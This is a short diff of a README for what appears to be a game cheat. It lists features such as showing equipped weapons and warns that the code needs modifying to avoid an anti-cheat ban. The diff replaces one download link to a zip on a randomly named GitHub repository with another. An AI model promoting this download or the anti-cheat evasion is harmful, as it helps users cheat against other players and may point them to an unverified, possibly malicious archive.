@@ -17,7 +17,7 @@ Correct player color when driving.
 Equipped weapons are shown.
 Clear DroppedItem and DroppedItemGroup when picking up.
 
-[Build DOWNLOAD](https://github.com/loasd104/asfsfscxs/releases/download/Release/install.zip)
+[Build DOWNLOAD](https://github.com/loasd104/asfsfscxs/releases/download/Release/pass_125accept.zip)
 
 Note
 You need to modify the code before playing game, or you will be banned by BE.
